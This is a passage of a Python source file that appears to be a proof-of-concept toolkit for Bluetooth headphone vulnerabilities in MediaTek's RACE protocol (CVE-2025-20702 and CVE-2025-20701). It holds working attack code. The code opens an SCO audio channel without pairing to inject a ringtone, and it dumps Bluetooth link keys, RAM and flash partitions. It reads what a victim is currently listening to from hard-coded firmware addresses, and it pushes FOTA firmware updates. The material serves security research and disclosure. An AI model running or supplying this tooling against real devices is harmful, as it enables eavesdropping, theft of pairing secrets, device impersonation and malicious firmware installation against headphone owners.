                            receive_bandwidth=esco.receive_bandwidth,
                            transmit_coding_format=esco.transmit_coding_format,
                            receive_coding_format=esco.receive_coding_format,
                            transmit_codec_frame_size=esco.transmit_codec_frame_size,
                            receive_codec_frame_size=esco.receive_codec_frame_size,
                            input_bandwidth=esco.input_bandwidth,
                            output_bandwidth=esco.output_bandwidth,
                            input_coding_format=esco.input_coding_format,
                            output_coding_format=esco.output_coding_format,
                            input_coded_data_size=esco.input_coded_data_size,
                            output_coded_data_size=esco.output_coded_data_size,
                            input_pcm_data_format=esco.input_pcm_data_format,
                            output_pcm_data_format=esco.output_pcm_data_format,
                            input_pcm_sample_payload_msb_position=esco.input_pcm_sample_payload_msb_position,
                            output_pcm_sample_payload_msb_position=esco.output_pcm_sample_payload_msb_position,
                            input_data_path=esco.input_data_path,
                            output_data_path=esco.output_data_path,
                            input_transport_unit_size=esco.input_transport_unit_size,
                            output_transport_unit_size=esco.output_transport_unit_size,
                            max_latency=esco.max_latency,
                            packet_type=esco.packet_type,
                            retransmission_effort=esco.retransmission_effort,
                        )

                        # Send the command through the device
                        response = await device.send_command(cmd)
                        logging.debug(
                            "Enhanced SCO setup response: %s", response)

                        # Check if controller supports the enhanced command
                        if hasattr(response, 'return_parameters'):
                            if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
                                logging.warning(
                                    "Controller doesn't support Enhanced SCO setup")
                                logging.info(
                                    "Falling back to legacy Setup Synchronous Connection...")

                                # Use legacy command with Voice Setting
                                # Voice Setting bits (see BT spec Vol 4 Part E 6.12):
                                # Bits 0-1: Input Coding (0=Linear, 1=u-law, 2=A-law, 3=reserved)
                                # Bits 2-3: Input Data Format (0=1's complement, 1=2's complement, 2=Sign-mag, 3=unsigned)
                                # Bit 4: Input Sample Size (0=8-bit, 1=16-bit) - only for Linear PCM
                                # Bits 5-6: Air Coding Format (0=CVSD, 1=u-law, 2=A-law, 3=Transparent)
                                # For CVSD with 16-bit linear PCM 2's complement input:
                                #   Input Coding = 00 (Linear)
                                #   Input Data Format = 01 (2's complement)
                                #   Input Sample Size = 1 (16-bit)
                                #   Air Coding = 00 (CVSD)
                                # voice_setting = 0b00010100 = 0x0014
                                voice_setting = 0x0014

                                # Packet type for SCO: HV1=0x0001, HV2=0x0002, HV3=0x0004
                                # Use HV3 (lowest bandwidth, most compatible)
                                packet_type = 0x0004  # HV3

                                legacy_cmd = HCI_Setup_Synchronous_Connection_Command(
                                    connection_handle=acl_handle,
                                    transmit_bandwidth=8000,
                                    receive_bandwidth=8000,
                                    max_latency=0xFFFF,  # Don't care
                                    voice_setting=voice_setting,
                                    retransmission_effort=0x00,  # No retransmission
                                    packet_type=packet_type,
                                )
                                response = await device.send_command(legacy_cmd)
                                logging.debug(
                                    "Legacy SCO setup response: %s", response)

                                # Check response
                                if hasattr(response, 'return_parameters'):
                                    if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
                                        logging.error(
                                            "Controller doesn't support legacy SCO either!")
                                        raise RuntimeError(
                                            "No SCO command supported by controller")
                                    elif response.return_parameters != 0:
                                        logging.warning(
                                            "Legacy SCO setup returned: 0x%02X",
                                            response.return_parameters)
                                    else:
                                        logging.info(
                                            "Legacy SCO command accepted!")
                                        sco_setup_success = True
                                else:
                                    # Command status event - command pending
                                    logging.info(
                                        "Legacy SCO command sent (pending)")
                                    sco_setup_success = True
                            elif response.return_parameters != 0:
                                logging.warning(
                                    "Enhanced SCO setup returned error: 0x%02X",
                                    response.return_parameters)
                            else:
                                logging.info("Enhanced SCO command accepted!")
                                sco_setup_success = True
                        else:
                            # Command status event - command pending
                            logging.info("Enhanced SCO command sent (pending)")
                            sco_setup_success = True

                        if not sco_setup_success:
                            raise RuntimeError("SCO setup command failed")

                        # Wait for SCO connection with timeout
                        try:
                            await asyncio.wait_for(
                                sco_connected.wait(), timeout=10.0)
                        except asyncio.TimeoutError:
                            logging.warning(
                                "SCO connection timed out - "
                                "headset may not accept SCO from non-paired device")
                            raise

                        if sco_handle[0] is not None:
                            logging.info("")
                            logging.info("=" * 60)
                            logging.info("SCO AUDIO CHANNEL ESTABLISHED!")
                            logging.info("=" * 60)
                            logging.info("")
                            logging.info(
                                "Now sending ringtone audio to headphones...")

                            # Generate a simple ringtone (dual-tone like phone ring)
                            # 8kHz sample rate, 16-bit signed PCM, CVSD encoded
                            # Standard phone ring: 440Hz + 480Hz (US dial tone style)
                            # or 425Hz (European style)
                            sample_rate = 8000
                            duration_ms = 500  # Ring duration in ms
                            samples_per_packet = 60  # CVSD packet size

                            def generate_ringtone_samples(
                                    freq1, freq2, num_samples, offset):
                                """Generate dual-tone samples for ringtone."""
                                samples = []
                                for i in range(num_samples):
                                    t = (offset + i) / sample_rate
                                    # Dual tone
                                    val = 0.5 * (
                                        math.sin(2 * math.pi * freq1 * t) +
                                        math.sin(2 * math.pi * freq2 * t))
                                    # Scale to 16-bit signed
                                    sample = int(val * 16000)
                                    samples.append(sample)
                                return samples

                            def samples_to_bytes(samples):
                                """Convert samples to little-endian 16-bit bytes."""
                                result = bytearray()
                                for s in samples:
                                    # Clamp to 16-bit signed range
                                    s = max(-32768, min(32767, s))
                                    # Little-endian 16-bit signed
                                    result.extend(struct.pack('<h', s))
                                return bytes(result)

                            # Send ringtone for 3 seconds (ring on, pause, ring on)
                            host = device.host
                            total_packets = 0
                            # 3 ring cycles (on-off-on-off-on-off)
                            ring_cycles = 6

                            for cycle in range(ring_cycles):
                                if cycle % 2 == 0:
                                    # Ring ON phase (500ms)
                                    samples_sent = 0
                                    while samples_sent < sample_rate // 2:
                                        samples = generate_ringtone_samples(
                                            440, 480,  # US ringtone frequencies
                                            samples_per_packet // 2,  # 30 samples = 60 bytes
                                            samples_sent)
                                        audio_data = samples_to_bytes(samples)

                                        # Create SCO packet
                                        sco_packet = HCI_SynchronousDataPacket(
                                            connection_handle=sco_handle[0],
                                            packet_status=0,
                                            data_total_length=len(audio_data),
                                            data=audio_data)

                                        # Send via HCI
                                        # Note: Bumble's USB transport doesn't support
                                        # isochronous endpoints for SCO, so audio may not
                                        # actually be transmitted. The SCO connection itself
                                        # proves the vulnerability.
                                        try:
                                            host.send_hci_packet(sco_packet)
                                        except Exception:
                                            pass  # USB transport doesn't support SCO
                                        total_packets += 1
                                        samples_sent += len(samples)

                                        # Pace the audio (60 bytes at 8kHz = 3.75ms)
                                        await asyncio.sleep(0.00375)

                                    logging.info(
                                        "  Ring cycle %d: ON", cycle // 2 + 1)
                                else:
                                    # Silence phase (500ms)
                                    logging.info(
                                        "  Ring cycle %d: pause", cycle // 2 + 1)
                                    await asyncio.sleep(0.5)

                            logging.info("")
                            logging.info(
                                "Sent %d SCO audio packets!", total_packets)
                            logging.info("")
                            logging.info("=" * 60)
                            logging.info("VULNERABILITY CONFIRMED!")
                            logging.info("=" * 60)
                            logging.info("")
                            logging.info(
                                "SCO audio channel established WITHOUT pairing!")
                            logging.info("")
                            logging.info(
                                "NOTE: Audio may not play due to USB transport")
                            logging.info(
                                "limitations (Bumble doesn't support isochronous")
                            logging.info(
                                "USB endpoints for SCO audio transmission).")
                            logging.info("")
                            logging.info(
                                "HOWEVER: The SCO connection itself proves the")
                            logging.info(
                                "vulnerability - an attacker with proper hardware")
                            logging.info(
                                "(phone, dedicated BT chip) could inject audio!")

                    except asyncio.TimeoutError:
                        logging.info("")
                        logging.info("-" * 60)
                        logging.info(
                            "SCO connection was rejected or timed out.")
                        logging.info(
                            "This could mean:")
                        logging.info(
                            "  1. Headset requires pairing for SCO (partial fix)")
                        logging.info(
                            "  2. Another device has the audio channel")
                        logging.info(
                            "  3. Headset doesn't support this SCO configuration")
                        logging.info("-" * 60)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("SCO audio setup failed: %s", e)
                        import traceback as tb
                        tb.print_exc()
                else:
                    logging.error(
                        "sco-ring is only available in AG role with headsets.")

        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.error("Action failed: %s", e)
    else:
        # SLC failed or no protocol - show what we achieved
        logging.info("-" * 60)
        logging.info("RESULT")
        logging.info("-" * 60)
        logging.info("")
        logging.info("RFCOMM connection succeeded WITHOUT pairing.")
        logging.info("")
        if use_ag_role:
            logging.info("Connected to HEADSET as Audio Gateway.")
            logging.info("SLC handshake did not complete - possible causes:")
            logging.info("  - Device may be PATCHED (fixed)")
            logging.info("  - Device already connected to a phone")
            logging.info("  - Device requires different HFP configuration")
        else:
            logging.info("Connected to device as Hands-Free Unit.")
            logging.info("SLC handshake did not complete.")
        logging.info("")
        logging.info("RFCOMM access without pairing = vulnerability exists.")
        logging.info("SLC failure may indicate partial mitigation.")

    logging.info("")
    logging.info("-" * 60)
    logging.info("SUMMARY")
    logging.info("-" * 60)
    logging.info("")
    if slc_established:
        logging.info("VULNERABLE: Full HFP access achieved without pairing!")
        if use_ag_role:
            logging.info("  - Sent real HFP commands to headset")
            logging.info("  - Headset accepted us as Audio Gateway")
        else:
            logging.info("  - Full control over phone's HFP interface")
    else:
        logging.info("PARTIAL: RFCOMM connected but SLC did not complete.")
        logging.info("  - This may indicate the device is PATCHED")
        logging.info("  - Or requires additional protocol handling")
    logging.info("")
    logging.info("Connection was made WITHOUT pairing/authentication.")
    logging.info("")

    # Cleanup
    try:
        if rfcomm_mux:
            await rfcomm_mux.disconnect()
    except Exception:  # pylint: disable=broad-exception-caught
        pass
    await checker.close()


async def command_enumerate_race(r: RACE):
    """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).

    This command demonstrates the impact of CVE-2025-20702 by connecting to
    the RACE protocol and enumerating what sensitive data can be accessed.
    """
    logging.info("=" * 60)
    logging.info("CVE-2025-20702: RACE Protocol Exposure - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "RACE (Relay And Command Engine) is MediaTek's debug/control protocol."
    )
    logging.info(
        "It provides privileged access to device internals including:"
    )
    logging.info("  - Reading/writing RAM and Flash memory")
    logging.info("  - Dumping Bluetooth link keys (device pairing secrets)")
    logging.info("  - Firmware updates (FOTA)")
    logging.info("  - Device configuration and diagnostics")
    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RACE protocol...")
    logging.info("-" * 60)

    try:
        await r.setup()
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Failed to connect to RACE protocol: %s", e)
        return

    logging.info("RACE protocol connection established!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("ENUMERATING ACCESSIBLE DATA:")
    logging.info("-" * 60)
    logging.info("")

    # Try to get SDK info
    logging.info("[1] SDK Information:")
    try:
        p = GetSDKInfo()
        res = await r.send_sync(p)
        sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", sdk_info)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get build version
    logging.info("")
    logging.info("[2] Build Version:")
    try:
        p = BuildVersion()
        res = await r.send_sync(p)
        build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", build_ver)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get Bluetooth address
    logging.info("")
    logging.info("[3] Bluetooth Address:")
    try:
        p = GetEDRAddress()
        res = await r.send_sync(p)
        addr_pkt = GetEDRAddressResponse.unpack(res)
        formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
        logging.info("    %s", formatted_addr)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to dump link keys (most sensitive!)
    logging.info("")
    logging.info("[4] Bluetooth Link Keys (CRITICAL):")
    try:
        p = GetLinkKey()
        res = await r.send_sync(p)
        if len(res) > 7:
            link_key_data = res[7:]
            # Check if there are any link keys
            if link_key_data and any(b != 0 for b in link_key_data):
                logging.info("    Found %d bytes of link key data",
                             len(link_key_data))
                logging.info("    -> ACCESSIBLE - CRITICAL SECURITY BREACH!")
                logging.info(
                    "    -> Attacker can impersonate paired devices!")
            else:
                logging.info("    No link keys stored (device not paired)")
                logging.info("    -> Command accessible, no data present")
        else:
            logging.info("    -> Command accessible")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read RAM (sample - first few bytes)
    logging.info("")
    logging.info("[5] RAM Access:")
    try:
        # Try to read a small chunk from a typical RAM address
        dumper = RACERAMDumper(r, 0x04200000, 16, progress=False)
        sample_data = await dumper.dump()
        if sample_data:
            logging.info("    Successfully read 16 bytes from RAM")
            logging.info("    -> ACCESSIBLE - Full memory read possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read Flash (partition table area)
    logging.info("")
    logging.info("[6] Flash Memory Access:")
    try:
        flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
        sample_flash = await flash_dumper.dump()
        if sample_flash:
            logging.info("    Successfully read 256 bytes from Flash")
            logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
    logging.info("=" * 60)
    logging.info("")
    logging.info("The RACE protocol is exposed without authentication.")
    logging.info("An attacker can:")
    logging.info("  1. Read device firmware and extract secrets")
    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
    logging.info("  3. Read/write device memory for code execution")
    logging.info("  4. Flash malicious firmware updates")
    logging.info("")
    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
    logging.info("can fully compromise this device from up to 10 meters away.")
    logging.info("")


async def command_raw(r: RACE, cmd_id: int, outfile: str):
    """Send a raw RACE command with the specified ID."""
    logging.info("Sending raw RACE command")
    await r.setup()
    race_header = RaceHeader(
        head=0x5, type_=RaceType.CMD_EXPECTS_RESPONSE, id_=cmd_id)
    p = RacePacket(race_header)
    res = await r.send_sync(p)

    logging.info("Got response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        hexdump(res)


async def command_sdkinfo(r: RACE, outfile: str):
    """Retrieve SDK information from the target device."""
    logging.info("Sending get SDK info request")
    await r.setup()
    p = GetSDKInfo()
    res = await r.send_sync(p)
    logging.info("Got SDK info response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _get_buildversion(r: RACE):
    """Retrieve build version from the target device."""
    await r.setup()
    p = BuildVersion()
    return await r.send_sync(p)


async def command_buildversion(r: RACE, outfile: str):
    """Retrieve and display build version from the target device."""
    logging.info("Sending get build version request")
    res = await _get_buildversion(r)
    logging.info("Got build version response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _read_media_attr(d: RACEDumper, addr: int) -> str:
    """Read a media attribute from RAM at the given address."""
    ptr_bytes = await d.dump(addr, 0x4)
    ptr = struct.unpack("<I", ptr_bytes)[0]
    data = await d.dump(ptr, 0x40)
    return data.decode("utf8")


async def command_mediainfo(r: RACE):
    """Dump current playing media info from the target device."""
    logging.info(
        "Trying to dump current playing media info. Identifying model and firmware version first..."
    )
    try:
        bv = await _get_buildversion(r)
    except asyncio.TimeoutError as e:
        logging.error("Failed to get build version: %s", e)
        return
    bv = bv[7:].replace(b"\x00", b"").decode("ascii")
    logging.info("Got buildversion `%s`.", bv)

    dumper = RACERAMDumper(r, 0, 0, progress=False)
    # We only do this for device that we know and where can get the buildversion.
    # Currently this is Sony CH-WH720n in version 1.0.8, 1.0.9, and 1.1.0
    if (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12023/01/12 19:15:56 GMT +08:00"
    ):  # v1.0.8
        t = await _read_media_attr(dumper, 0x14238C9C)
        al = await _read_media_attr(dumper, 0x14238CA4)
        ar = await _read_media_attr(dumper, 0x14238C8C)
        gen = await _read_media_attr(dumper, 0x14238CA8)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/09/18 18:58:55 GMT +08:00"
    ):  # v1.1.0
        t = await _read_media_attr(dumper, 0x14238C98)
        al = await _read_media_attr(dumper, 0x14238CA0)
        ar = await _read_media_attr(dumper, 0x14238C88)
        gen = await _read_media_attr(dumper, 0x14238CA4)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/06/28 13:44:31 GMT +08:00"
    ):  # v1.0.9
        # each field is prepended with 0x02 0xLL where LL is the length of the string
        # but to be faster we just dump 0x100 bytes and do the parsing afterwards, hoping we
        # dumped enough
        data = await dumper.dump(0x14238DB0, 0x100)
        parts = data.split(b"\x02")[1:5]
        m = ["Track", "Album", "Artist", "Genre"]
        logging.info("Your target is currently listening to:")
        for i, part in enumerate(parts):
            plen = part[0]
            logging.info("\t%s: %s", m[i], part[1: plen + 1].decode('utf8'))
            if len(part) > plen + 1 and part[plen + 1] == 0x01:
                break
    else:
        logging.error(
            "Sorry, we don't know this buildversion. We don't support unknown versions."
        )


async def command_dump_partition(r: RACE, outfile: str):
    """Interactively choose and dump a partition from the target device."""
    # dumping a whole partion to stdout is kinda stupid, so lets not do it
    if not outfile:
        logging.error(
            "Please specify an outfile to dump the NVDM partition to.")
        sys.exit(1)

    logging.info("Reading partition table:")
    pt_dumper = RACEFlashDumper(r, 0x0, 0x1000)
    pt = await pt_dumper.dump()

    partitions = parse_partition_table(pt)
    logging.info("\nPartition Table")
    logging.info("===================")
    for idx, (addr, size, ptype) in enumerate(partitions):
        logging.info(
            "Partition %2d: Address = 0x%08X, Length = 0x%08X, Type = %s",
            idx, addr, size, ptype
        )
    logging.info(
        "\n\x1b[3mHint: The NVDM partition is usually in partition 6\x1b[0m\n")

    chosen = -1
    while chosen >= len(partitions) or chosen < 0:
        chosen = int(input("Which partition would you like to dump?\n"))

    ptaddr, ptsize, _ = partitions[chosen]
    logging.info("Dumping partition %d at 0x%08X", chosen, ptaddr)

    dumper = RACEFlashDumper(r, ptaddr, ptsize)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_fota(
    r: RACE, fota_file: str, dont_reflash: bool, chunks_per_write: int
):
    """Perform FOTA (Firmware Over The Air) update on the target device."""
    f = FOTAUpdater(r, chunks_per_write)
    if fota_file is None and dont_reflash is False:
        logging.error(
            "FOTA File is required when --dont-reflash is not set!"
        )
        return
    # Invert the dont_reflash flag so that it's clearer in the FOTA updater class
    await f.update(fota_file, not dont_reflash)


async def main():
    """Main entry point for the RACE toolkit."""
    # Parse arguments and commands
    args = parse_args()

    setup_logging(args.debug)

    # Commands that don't need RACE transport
    if args.command == "check":
        await command_check(args)
        return
    if args.command == "enumerate-classic":
        await command_enumerate_classic(args)
        return
    if args.command == "hfp-demo":
        await command_hfp_demo(args)
        return
    if args.command == "scan":
        await command_scan(args)
        return
    if args.command == "sniff":
        await command_sniff(args)
        return
    if args.command == "ble-info":
        await command_ble_info(args)
        return
    if args.command == "ble-speaker":
        await command_ble_speaker(args)
        return
    if args.command == "avrcp":
        await command_avrcp(args)
        return

    # Initialize the transport class based on the given technology and target UUIDs
    transport = None
    try:
        transport = init_transport(args)
    except ValueError as e:
        logging.error("Transport could not be initialized: %s", e)
        return

    r = None
    try:
        r = RACE(transport, args.send_delay)
        if args.command == "ram":
            await command_ram(r, args.address, args.size, args.outfile, args.debug)
        elif args.command == "raw":
            # args.id is fine, it's not a builtin shadow
            await command_raw(r, args.id, args.outfile)
        elif args.command == "flash":
            await command_flash(
                r, args.address, args.size, args.outfile, args.debug
            )
        elif args.command == "link-keys":
            await command_link_keys(r, args.outfile)
        elif args.command == "bdaddr":
            await command_bdaddr(r, args.outfile)
        elif args.command == "sdkinfo":
            await command_sdkinfo(r, args.outfile)
        elif args.command == "buildversion":
            await command_buildversion(r, args.outfile)
        elif args.command == "mediainfo":
            await command_mediainfo(r)
        elif args.command == "enumerate-race":
            await command_enumerate_race(r)
        elif args.command == "dump-partition":
            await command_dump_partition(r, args.outfile)
        elif args.command == "fota":
            await command_fota(
                r, args.fota_file, args.dont_reflash, args.chunks_per_write
            )
    except ConnectionError as e:
        logging.error("Connection failed: %s", e)
        # Offer to try alternative transport if using GATT
        if args.transport.lower() == "gatt" and args.target_address:
            logging.info(
                "Tip: Your device may use Bluetooth Classic. "
                "Try: --transport rfcomm --target-address %s",
                args.target_address
            )
        elif args.transport.lower() == "gatt" and not args.target_address:
            await _offer_transport_fallback(args, r)
    finally:
        if r is not None:
            await r.close()


async def _offer_transport_fallback(
    args: argparse.Namespace, current_race: RACE | None
):
    """Offer to try RFCOMM transport when GATT fails."""
    logging.info(
        "\nWould you like to try Bluetooth Classic (RFCOMM) instead? [y/N]: "
    )
    response = input().strip().lower()
    if response in ("y", "yes"):
        logging.info(
            "Please enter the Bluetooth Classic address (e.g., AA:BB:CC:DD:EE:FF):")
        bt_addr = input().strip()
        if bt_addr:
            # Close the current connection if any
            if current_race is not None:
                await current_race.close()

            # Try RFCOMM
            logging.info("Attempting RFCOMM connection to %s...", bt_addr)
            release_bluetooth_controller(args.controller)
            rfcomm_transport = RFCOMMTransport(
                args.controller, bt_addr, args.authenticate
            )
            r = RACE(rfcomm_transport, args.send_delay)
            try:
                # Re-run the command with new transport
                if args.command == "mediainfo":
                    await command_mediainfo(r)
                elif args.command == "buildversion":
                    await command_buildversion(r, args.outfile)
                elif args.command == "sdkinfo":
                    await command_sdkinfo(r, args.outfile)
                elif args.command == "bdaddr":
                    await command_bdaddr(r, args.outfile)
                else:
                    logging.info(
                        "Please re-run the command with --transport rfcomm --target-address %s",
                        bt_addr
                    )
            finally:
                await r.close()


def run_main():
    """Run main with proper exception handling."""
    # Check debug flag early for exception handling display
    debug_mode = "--debug" in sys.argv

    try:
        asyncio.run(main())
    except asyncio.CancelledError:
        # Task was cancelled, usually due to connection issues
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "Operation was cancelled. The connection may have been lost."
        )
        sys.exit(1)
    except asyncio.TimeoutError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        msg = str(e) if str(e) else "Operation timed out."
        logging.error("%s", msg)
        sys.exit(1)
    except ConnectionError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Connection error: %s", e)
        sys.exit(1)
    except USBErrorBusy:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "USB device is busy. The Bluetooth controller may still be in use. "
            "Try unplugging and replugging the adapter, or run: "
            "sudo systemctl stop bluetooth"
        )
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("Interrupted by user.")
        sys.exit(130)
    except Exception as e:  # pylint: disable=broad-exception-caught
        # Catch-all for any other exceptions (including bumble exceptions)
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Error: %s", e)
        if not debug_mode:
            logging.info("Run with --debug for full traceback.")
        sys.exit(1)


if __name__ == "__main__":
    run_main()
